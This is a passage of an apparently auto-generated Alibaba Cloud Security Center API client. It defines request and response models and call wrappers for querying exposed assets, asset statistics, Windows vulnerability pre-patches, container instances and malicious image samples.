  exposedComponentCount?: int32(name='ExposedComponentCount'),
  exposedInstanceCount?: int32(name='ExposedInstanceCount'),
  exposedIpCount?: int32(name='ExposedIpCount'),
  exposedLaterVulCount?: int32(name='ExposedLaterVulCount'),
  exposedNntfVulCount?: int32(name='ExposedNntfVulCount'),
  exposedPortCount?: int32(name='ExposedPortCount'),
  exposedWeekPasswordMachineCount?: int32(name='ExposedWeekPasswordMachineCount'),
  gatewayAssetCount?: int32(name='GatewayAssetCount'),
  requestId?: string(name='RequestId'),
}

model DescribeExposedStatisticsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeExposedStatisticsResponseBody(name='body'),
}

async function describeExposedStatisticsWithOptions(runtime: Util.RuntimeOptions): DescribeExposedStatisticsResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeExposedStatistics',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeExposedStatistics(): DescribeExposedStatisticsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeExposedStatisticsWithOptions(runtime);
}

model DescribeExposedStatisticsDetailRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 20. If you leave this parameter empty, 20 entries are returned on each page.

>  We recommend that you do not leave this parameter empty.', example='20'),
  statisticsType?: string(name='StatisticsType', description='The type of the exposed asset. Valid values:

*   **exposureType**: gateway assets
*   **exposurePort**: ports
*   **exposureComponent**: system components
*   **exposureIp**: IP addresses', example='exposureType'),
  statisticsTypeGatewayType?: string(name='StatisticsTypeGatewayType', description='The type of the gateway asset. This parameter is required when the **StatisticsType** parameter is set to **exposureType**. Valid values:

*   **SLB**: the public IP address of a Server Load Balancer (SLB) instance
*   **DNAT**: the NAT gateway that connects to the Internet by using the DNAT feature', example='SLB'),
  statisticsTypeInstanceValue?: string(name='StatisticsTypeInstanceValue', description='The ID of the gateway asset. This parameter is required when the **StatisticsType** parameter is set to **exposureType**.', example='lb-2ze4rso39h4nczcqs****'),
}

model DescribeExposedStatisticsDetailResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='2'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='2'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7CBAFB3F-1ED7-4A23-986A-6F67F0466BD1'),
  statisticsDetails?: [ 
    {
      exposedCount?: int32(name='ExposedCount', description='The total number of system vulnerabilities that are detected on your server and are exposed on the Internet.', example='0'),
      exposureComponent?: string(name='ExposureComponent', description='The system component that is exposed on the Internet.', example='tomcat'),
      exposureIp?: string(name='ExposureIp', description='The public IP address that is exposed on the Internet.', example='123.57.XX.XX'),
      exposurePort?: string(name='ExposurePort', description='The port that is exposed on the Internet.', example='22'),
      exposureType?: string(name='ExposureType', description='The resource from which the asset is exposed. Valid values:

*   **INTERNET_IP**: the IP address of the Elastic Compute Service (ECS) instance
*   **SLB**: the public IP address of the SLB instance
*   **EIP**: the elastic IP address (EIP)
*   **DNAT**: the NAT gateway that connects to the Internet by using the DNAT feature', example='SLB'),
      exposureTypeId?: string(name='ExposureTypeId', description='The ID of the instance to which the resource belongs. The valid values of this parameter vary based on the value of the ExposureType parameter.

*   If the value of the **ExposureType** parameter is **INTERNET_IP**, the value of this parameter is an empty string.
*   If the value of the **ExposureType** parameter is **SLB**, the value of this parameter is the ID of the Internet-facing SLB instance.
*   If the value of the **ExposureType** parameter is **EIP**, the value of this parameter is the ID of the EIP.
*   If the value of the **ExposureType** parameter is **DNAT**, the value of this parameter is the ID of the NAT gateway.', example='lb-2ze4rso39h4nczcqs****'),
      exposureTypeInstanceName?: string(name='ExposureTypeInstanceName', description='The name of the gateway asset that is exposed on the Internet.', example='ngw-bp1vkbju8f3w87c9v****'),
      regionId?: string(name='RegionId', description='The region ID of the asset.', example='cn-hangzhou'),
    }
  ](name='StatisticsDetails', description='An array consisting of the gateway assets, ports, system components, or public IP addresses that are exposed on the Internet and are returned.'),
}

model DescribeExposedStatisticsDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeExposedStatisticsDetailResponseBody(name='body'),
}

async function describeExposedStatisticsDetailWithOptions(request: DescribeExposedStatisticsDetailRequest, runtime: Util.RuntimeOptions): DescribeExposedStatisticsDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.statisticsType)) {
    query['StatisticsType'] = request.statisticsType;
  }
  if (!Util.isUnset(request.statisticsTypeGatewayType)) {
    query['StatisticsTypeGatewayType'] = request.statisticsTypeGatewayType;
  }
  if (!Util.isUnset(request.statisticsTypeInstanceValue)) {
    query['StatisticsTypeInstanceValue'] = request.statisticsTypeInstanceValue;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeExposedStatisticsDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeExposedStatisticsDetail(request: DescribeExposedStatisticsDetailRequest): DescribeExposedStatisticsDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeExposedStatisticsDetailWithOptions(request, runtime);
}

model DescribeFieldStatisticsRequest {
  machineTypes?: string(name='MachineTypes', description='The type of the asset to query. If no asset types are specified, all types of assets are returned. Valid values:

*   **ecs**: server
*   **cloud_product**: Alibaba Cloud service', example='ecs'),
  regionId?: string(name='RegionId', description='The ID of the region in which the asset resides.', example='cn-hangzhou'),
}

model DescribeFieldStatisticsResponseBody = {
  groupedFields?: {
    aliYunInstanceCount?: int32(name='AliYunInstanceCount', description='The number of assets that are deployed on Alibaba Cloud.', example='100'),
    awsInstanceCount?: int32(name='AwsInstanceCount', description='The number of servers.', example='100'),
    exposedInstanceCount?: int32(name='ExposedInstanceCount', description='The number of exposed servers.', example='1'),
    generalAssetCount?: int32(name='GeneralAssetCount', description='The number of assets whose importance is common.', example='10'),
    groupCount?: int32(name='GroupCount', description='The number of server groups.', example='20'),
    huaweiInstanceCount?: int32(name='HuaweiInstanceCount', description='The number of instances that are provisioned by third-party providers.', example='0'),
    idcInstanceCount?: int32(name='IdcInstanceCount', description='The number of assets that can be protected by Security Center.', example='100'),
    importantAssetCount?: int32(name='ImportantAssetCount', description='The number of assets whose importance is important.', example='10'),
    instanceCount?: int32(name='InstanceCount', description='The total number of assets of the specified type. If no asset types are specified, this parameter indicates the total number of all servers and Alibaba Cloud services within your account.', example='100'),
    instanceSyncTaskCount?: int32(name='InstanceSyncTaskCount', description='The total number of tasks for the specified type of assets. If no asset types are specified, this parameter indicates the total number of all servers and Alibaba Cloud services within your account.', example='10'),
    newInstanceCount?: int32(name='NewInstanceCount', description='The number of newly added servers.', example='10'),
    noRiskInstanceCount?: int32(name='NoRiskInstanceCount', description='The number of assets that do not pose risks.', example='10'),
    notRunningStatusCount?: int32(name='NotRunningStatusCount', description='The number of servers that are shut down.', example='10'),
    offlineInstanceCount?: int32(name='OfflineInstanceCount', description='The number of servers whose Security Center agent status is Offline.', example='21'),
    outMachineInstanceCount?: int32(name='OutMachineInstanceCount', description='The number of servers outside the cloud.', example='20'),
    pauseInstanceCount?: int32(name='PauseInstanceCount', description='The number of servers for which the Security Center agent suspends protection.', example='10'),
    regionCount?: int32(name='RegionCount', description='The number of regions to which the servers belong.', example='11'),
    riskInstanceCount?: int32(name='RiskInstanceCount', description='The number of assets that are at risk.', example='90'),
    tencentInstanceCount?: int32(name='TencentInstanceCount', description='The total number of cloud services that are protected by Security Center.', example='10'),
    testAssetCount?: int32(name='TestAssetCount', description='The number of assets whose importance is test.', example='10'),
    tripartiteInstanceCount?: int32(name='TripartiteInstanceCount', description='The number of simple application servers.', example='2'),
    unKnowStatusInstanceCount?: int32(name='UnKnowStatusInstanceCount', description='The number of assets whose statuses are unknown.', example='1'),
    unprotectedInstanceCount?: int32(name='UnprotectedInstanceCount', description='The number of unprotected assets.', example='10'),
    vpcCount?: int32(name='VpcCount', description='The number of virtual private clouds (VPCs).', example='5'),
  }(name='GroupedFields', description='The information about servers that are returned.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
}

model DescribeFieldStatisticsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeFieldStatisticsResponseBody(name='body'),
}

async function describeFieldStatisticsWithOptions(request: DescribeFieldStatisticsRequest, runtime: Util.RuntimeOptions): DescribeFieldStatisticsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.machineTypes)) {
    query['MachineTypes'] = request.machineTypes;
  }
  if (!Util.isUnset(request.regionId)) {
    query['RegionId'] = request.regionId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeFieldStatistics',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeFieldStatistics(request: DescribeFieldStatisticsRequest): DescribeFieldStatisticsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeFieldStatisticsWithOptions(request, runtime);
}

model DescribeFrontVulPatchListRequest {
  info?: string(name='Info', description='The information about the Windows system vulnerability. The value is a JSON string that contains the following fields:

*   **name**: the name of the vulnerability.
*   **uuid**: the UUID of the server on which the vulnerability is detected.
*   **tag**: the tag that is added to the vulnerability. Set this field to **system**, which indicates Windows system vulnerabilities.', example='[{"name":"5000803","uuid":"026c9296-1234-5678-b937-a7d81f05****","tag":"system"}]'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  operateType?: string(name='OperateType', description='The operation that you want to perform on the vulnerability. Set the value to **vul_fix**, which indicates vulnerability fixing.', example='vul_fix'),
  type?: string(name='Type', description='The type of the vulnerability. Set the value to **sys**, which indicates Windows system vulnerabilities.', example='sys'),
}

model DescribeFrontVulPatchListResponseBody = {
  frontPatchList?: [ 
    {
      patchList?: [ 
        {
          aliasName?: string(name='AliasName', description='The name of the Windows system vulnerability.', example='RHBA-2019:2599: krb5 bug fix update'),
          name?: string(name='Name', description='The version number of the pre-patch that is required to fix the Windows system vulnerability.', example='4523204'),
        }
      ](name='PatchList', description='An array consisting of the pre-patches that are required to fix the specified Windows system vulnerability on the server.'),
      uuid?: string(name='Uuid', description='The UUID of the server.', example='1587bedb-fdb4-48c4-9330-4545****'),
    }
  ](name='FrontPatchList', description='An array consisting of the information about the pre-patches that are required to fix the specified Windows system vulnerability.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='F929E952-EBFC-56C3-BD35-BF8B59024C68'),
}

model DescribeFrontVulPatchListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeFrontVulPatchListResponseBody(name='body'),
}

async function describeFrontVulPatchListWithOptions(request: DescribeFrontVulPatchListRequest, runtime: Util.RuntimeOptions): DescribeFrontVulPatchListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.info)) {
    query['Info'] = request.info;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.operateType)) {
    query['OperateType'] = request.operateType;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeFrontVulPatchList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeFrontVulPatchList(request: DescribeFrontVulPatchListRequest): DescribeFrontVulPatchListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeFrontVulPatchListWithOptions(request, runtime);
}

model DescribeGroupedContainerInstancesRequest {
  criteria?: string(name='Criteria', description='The search conditions for assets. Specify the value in the JSON format. Separate multiple search conditions with commas (,). Example: `[{"name":"riskStatus","value":"YES"},{"name":"riskLevel","value":"2"}]`.

>  Supported search conditions include the instance ID, instance name, virtual private cloud (VPC) ID, region, and public IP address. You can call the [DescribeCriteria](~~DescribeCriteria~~) operation to query the supported search conditions.', example='[{"name":"riskStatus","value":"YES"},{"name":"riskLevel","value":"2"}]'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  fieldValue?: string(name='FieldValue', description='The keyword that you want to use to query containers. You must specify this parameter based on the value of the GroupField parameter.

*   If the **GroupField** parameter is set to **pod**, set this parameter to the name of the pod that you want to query.
*   If the **GroupField** parameter is set to **appName**, set this parameter to the name of the application that you want to query.
*   If the **GroupField** parameter is set to **namespace**, set this parameter to the namespace that you want to query.
*   If the **GroupField** parameter is set to **clusterId**, set this parameter to the ID of the cluster that you want to query.

>  Fuzzy match is supported.', example='cas-adad-qeqwe'),
  groupField?: string(name='GroupField', description='The group type that you want to use to query containers. Valid values:

*   **pod**
*   **appName**
*   **namespace**
*   **clusterId**', example='pod'),
  logicalExp?: string(name='LogicalExp', description='The logical relationship that you want to use to evaluate multiple search conditions. Valid values:

*   **OR**: Search conditions are evaluated by using a logical **OR**.
*   **AND**: Search conditions are evaluated by using a logical **AND**.', example='OR'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **20**.

>  We recommend that you do not leave this parameter empty.', example='20'),
}

model DescribeGroupedContainerInstancesResponseBody = {
  groupedContainerInstanceList?: [ 
    {
      alarmCount?: int32(name='AlarmCount', description='The number of alerts that are generated on the current pod, application, namespace, or cluster.', example='1'),
      appName?: string(name='AppName', description='The name of the application.', example='oss-liveness-probe'),
      clusterId?: string(name='ClusterId', description='The ID of cluster.', example='cf3824769c85441b4bf3****'),
      clusterName?: string(name='ClusterName', description='The name of the instance.', example='test'),
      clusterType?: string(name='ClusterType', description='The type of the cluster. Valid values:

*   **Kubernetes**: dedicated Kubernetes cluster
*   **ManagedKubernetes**: standard managed cluster (edge cluster)
*   **Ask**: standard serverless cluster', example='ManagedKubernetes'),
      createTime?: long(name='CreateTime', description='The timestamp when the cluster was created. Unit: milliseconds.', example='1600076893000'),
      custerState?: string(name='CusterState', description='The status of the cluster. Valid values:

*   **running**: The cluster is running.
*   **stopped**: The cluster is stopped.
*   **deleted**: The cluster is deleted.
*   **delete_failed**: The cluster fails to be deleted.
*   **failed**: The cluster fails to be created.', example='running'),
      hcCount?: int32(name='HcCount', description='The number of baseline risks that are detected on the current pod, application, namespace, or cluster.', example='20'),
      hostIp?: string(name='HostIp', description='The IP address of the host in the container cluster.', example='172.114.XX.XX'),
      image?: string(name='Image', description='The image of the container.', example='registry-vpc.ap-southeast-5.aliyuncs.com/log-service-release/sls-connector:1.1.77'),
      imageDigest?: string(name='ImageDigest', description='The digest value of the image.', example='58e58c013f70bbfde140c8a55c1078074b3483479428d4069aa946827fd566cf'),
      imageRepoName?: string(name='ImageRepoName', description='The name of the image repository.', example='test-003'),
      imageRepoNamespace?: string(name='ImageRepoNamespace', description='The namespace to which the image repository belongs.', example='name001'),
      imageRepoTag?: string(name='ImageRepoTag', description='The tag that is added to the image repository.', example='dev-20220512-2'),
      imageUuid?: string(name='ImageUuid', description='The UUID of the image.', example='e4bdec1d9ba7e0967111a7ea467c****'),
      instanceCount?: int32(name='InstanceCount', description='The number of queried pods, applications, clusters, or namespaces.', example='9'),
      instanceId?: string(name='InstanceId', description='The ID of the server.', example='i-8vb9ul5xec4tua4q****'),
      namespace?: string(name='Namespace', description='The namespace of the cluster.', example='kube-system'),
      pod?: string(name='Pod', description='The name of the pod.', example='csi-plugin-2n****'),
      podIp?: string(name='PodIp', description='The IP address of the pod.', example='172.114.XX.XX'),
      regionId?: string(name='RegionId', description='The ID of the region in which the server resides.', example='cn-hangzhou'),
      riskInstanceCount?: int32(name='RiskInstanceCount', description='The number of at-risk instances.', example='1'),
      riskLevel?: string(name='RiskLevel', description='The risk level. Valid values:

*   **high**
*   **medium**
*   **low**', example='low'),
      riskStatus?: string(name='RiskStatus', description='Indicates whether risks were detected. Valid values:

*   **NO**: No risks were detected.
*   **YES**: Risks were detected.', example='NO'),
      vulCount?: int32(name='VulCount', description='The number of vulnerabilities that are detected on the current pod, application, namespace, or cluster.', example='1'),
    }
  ](name='GroupedContainerInstanceList', description='An array that consists of the container assets returned.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of container assets returned on the current page.', example='20'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: **20**.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of container assets returned.', example='25'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='4E5BFDCF-B9DD-430D-9DA4-151BCB581C9D'),
}

model DescribeGroupedContainerInstancesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeGroupedContainerInstancesResponseBody(name='body'),
}

async function describeGroupedContainerInstancesWithOptions(request: DescribeGroupedContainerInstancesRequest, runtime: Util.RuntimeOptions): DescribeGroupedContainerInstancesResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.criteria)) {
    query['Criteria'] = request.criteria;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.fieldValue)) {
    query['FieldValue'] = request.fieldValue;
  }
  if (!Util.isUnset(request.groupField)) {
    query['GroupField'] = request.groupField;
  }
  if (!Util.isUnset(request.logicalExp)) {
    query['LogicalExp'] = request.logicalExp;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeGroupedContainerInstances',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeGroupedContainerInstances(request: DescribeGroupedContainerInstancesRequest): DescribeGroupedContainerInstancesResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeGroupedContainerInstancesWithOptions(request, runtime);
}

model DescribeGroupedInstancesRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  fieldValue?: string(name='FieldValue', description='The name of the group to which the assets belong. Fuzzy search is supported.', example='test-01'),
  groupField?: string(name='GroupField', description='The filter condition that you want to use to query the assets. Valid values:

*   **groupId**: the group to which the assets belong
*   **regionId**: the region in which the assets reside
*   **vpcInstanceId**: the virtual private cloud (VPC) in which the assets reside', example='groupId'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  machineTypes?: string(name='MachineTypes', description='The type of the assets that you want to query. Set the value to **ecs**, which indicates Elastic Compute Service (ECS) instances.', example='ecs'),
  noPage?: boolean(name='NoPage', description='Specifies whether to enable paged query. Default value: **true**. Valid values:

*   **true**: yes
*   **false**: no', example='true'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **20**.', example='20'),
  vendor?: int32(name='Vendor', description='The source of the server. Valid values:

*   **0**: an asset provided by Alibaba Cloud.
*   **1**: a third-party cloud server
*   **2**: a server in a data center
*   **3**, **4**, **5**, and **7**: other cloud asset
*   **8**: a lightweight asset', example='0'),
  vendors?: string(name='Vendors', description='The source of the server. Separate multiple sources with commas (,).Valid values:

*   **0**: an asset provided by Alibaba Cloud.
*   **1**: a third-party cloud server
*   **2**: a server in a data center
*   **3**, **4**, **5**, and **7**: other cloud asset
*   **8**: a lightweight asset', example='0,8'),
}

model DescribeGroupedInstancesResponseBody = {
  instances?: [ 
    {
      asapVulInstanceCount?: long(name='AsapVulInstanceCount', description='The number of assets on which high-risk vulnerabilities are detected.', example='11'),
      fieldAliasName?: string(name='FieldAliasName', description='The name of the server group.', example='testA'),
      groupFlag?: int32(name='GroupFlag', description='The type of the server group. Valid values:

*   **0**: the default group
*   **1**: other group', example='1'),
      instanceCount?: string(name='InstanceCount', description='The total number of assets that belong to the specified type.

>  If the **MachineTypes** request parameter is not specified, the value of the InstanceCount parameter is the total number of your assets.', example='205'),
      riskInstanceCount?: string(name='RiskInstanceCount', description='The number of assets that are at risk.', example='172'),
      unProtectedInstanceCount?: string(name='UnProtectedInstanceCount', description='The number of assets that are not protected by Security Center.', example='32'),
    }
  ](name='Instances', description='An array that consists of the information about the assets.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='20'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='5'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: **20**.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='100'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='52A3AEE6-114A-499D-8990-4BA9B27FE0AA'),
}

model DescribeGroupedInstancesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeGroupedInstancesResponseBody(name='body'),
}

async function describeGroupedInstancesWithOptions(request: DescribeGroupedInstancesRequest, runtime: Util.RuntimeOptions): DescribeGroupedInstancesResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.fieldValue)) {
    query['FieldValue'] = request.fieldValue;
  }
  if (!Util.isUnset(request.groupField)) {
    query['GroupField'] = request.groupField;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.machineTypes)) {
    query['MachineTypes'] = request.machineTypes;
  }
  if (!Util.isUnset(request.noPage)) {
    query['NoPage'] = request.noPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.vendor)) {
    query['Vendor'] = request.vendor;
  }
  if (!Util.isUnset(request.vendors)) {
    query['Vendors'] = request.vendors;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeGroupedInstances',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeGroupedInstances(request: DescribeGroupedInstancesRequest): DescribeGroupedInstancesResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeGroupedInstancesWithOptions(request, runtime);
}

model DescribeGroupedMaliciousFilesRequest {
  clusterId?: string(name='ClusterId', description='The cluster ID of the container on which the malicious image sample is detected.', example='c556c8133b5ad4378b7fc533ddbda****'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Pages start from page **1**. Default value: **1**.', example='1'),
  fuzzyMaliciousName?: string(name='FuzzyMaliciousName', description='The name of the malicious image sample that you want to query.

>  Fuzzy match is supported.', example='Mining'),
  imageDigest?: string(name='ImageDigest', description='The image digest.', example='6a5e103187b31a94592a47a5858617f7****'),
  imageLayer?: string(name='ImageLayer', description='The image layer.', example='27213ad375b53628dd152a5ca****'),
  imageTag?: string(name='ImageTag', description='The image tag.', example='0.2'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  levels?: string(name='Levels', description='The severity of the malicious image sample that you want to query. You can enter multiple severities. Separate the severities with commas (,). Valid values:

*   **serious**
*   **suspicious**
*   **remind**', example='serious'),
  maliciousMd5?: string(name='MaliciousMd5'),
  pageSize?: string(name='PageSize', description='The number of entries to return on each page. Default value: **20**.', example='20'),
  repoId?: string(name='RepoId', description='The ID of the image repository.

>  You can call the [ListRepository](~~145293~~) operation to query the IDs of image repositories from the value of the **RepoId** response parameter.', example='crr-vridcl4****'),
  repoInstanceId?: string(name='RepoInstanceId', description='The ID of the container image.

>  You can call the [ListRepository](~~145293~~) operation to query the IDs of container images from the value of the **InstanceId** response parameter.', example='cri-datvailb****'),
  repoName?: string(name='RepoName', description='The name of the image repository.

>  Fuzzy match is supported.', example='centos'),
  repoNamespace?: string(name='RepoNamespace', description='The namespace to which the image repository belongs.

>  Fuzzy match is supported.', example='hanghai-namespace'),
  repoRegionId?: string(name='RepoRegionId', description='The region ID of the image repository. Valid values:

*   **cn-beijing**: China (Beijing)
*   **cn-zhangjiakou**: China (Zhangjiakou)
*   **cn-hangzhou**: China (Hangzhou)
*   **cn-shanghai**: China (Shanghai)
*   **cn-shenzhen**: China (Shenzhen)
*   **cn-hongkong**: China (Hong Kong)
*   **ap-southeast-1**: Singapore
*   **ap-southeast-5**: Indonesia (Jakarta)
*   **us-east-1**: US (Virginia)
*   **us-west-1**: US (Silicon Valley)
*   **eu-central-1**: Germany (Frankfurt)
*   **eu-west-1**: UK (London)
*   **ap-south-1**: India (Mumbai)', example='cn-shanghai'),
  scanRange?: [ string ](name='ScanRange', description='The types of the assets that you want to scan.'),
}

model DescribeGroupedMaliciousFilesResponseBody = {
  groupedMaliciousFileResponse?: [ 
    {
      firstScanTimestamp?: long(name='FirstScanTimestamp', description='The timestamp when the first scan was performed. Unit: milliseconds.', example='1594907349000'),
      imageCount?: long(name='ImageCount', description='The number of affected images.', example='3'),
      latestScanTimestamp?: long(name='LatestScanTimestamp', description='The timestamp when the last scan was performed. Unit: milliseconds.', example='1596533942000'),
      level?: string(name='Level', description='The severity of the malicious image sample. Valid values:

*   **serious**
*   **suspicious**
*   **remind**', example='serious'),
      maliciousMd5?: string(name='MaliciousMd5', description='The MD5 hash value of the malicious image sample.', example='d836968041f7683b5459****'),
      maliciousName?: string(name='MaliciousName', description='The name of the malicious image sample.', example='testFile'),
      status?: int32(name='Status', description='The handling status of the malicious image sample. Valid values:

*   **0**: unhandled
*   **1**: handled
*   **2**: verifying
*   **3**: added to the whitelist', example='0'),
    }
  ](name='GroupedMaliciousFileResponse', description='An array that consists of the malicious image samples.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='2'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: **20**.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='2'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='8045E03E-6D91-4C53-9F22-5A1B84BB29D9'),
}

model DescribeGroupedMaliciousFilesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeGroupedMaliciousFilesResponseBody(name='body'),
}

async function describeGroupedMaliciousFilesWithOptions(request: DescribeGroupedMaliciousFilesRequest, runtime: Util.RuntimeOptions): DescribeGroupedMaliciousFilesResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.fuzzyMaliciousName)) {
    query['FuzzyMaliciousName'] = request.fuzzyMaliciousName;
  }
  if (!Util.isUnset(request.imageDigest)) {
    query['ImageDigest'] = request.imageDigest;
  }
  if (!Util.isUnset(request.imageLayer)) {
    query['ImageLayer'] = request.imageLayer;
  }
  if (!Util.isUnset(request.imageTag)) {
    query['ImageTag'] = request.imageTag;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.levels)) {
    query['Levels'] = request.levels;
  }
  if (!Util.isUnset(request.maliciousMd5)) {
    query['MaliciousMd5'] = request.maliciousMd5;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.repoId)) {
    query['RepoId'] = request.repoId;
  }
  if (!Util.isUnset(request.repoInstanceId)) {
    query['RepoInstanceId'] = request.repoInstanceId;
  }
  if (!Util.isUnset(request.repoName)) {
    query['RepoName'] = request.repoName;
  }
  if (!Util.isUnset(request.repoNamespace)) {
    query['RepoNamespace'] = request.repoNamespace;
  }
  if (!Util.isUnset(request.repoRegionId)) {
    query['RepoRegionId'] = request.repoRegionId;
  }
  if (!Util.isUnset(request.scanRange)) {
    query['ScanRange'] = request.scanRange;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
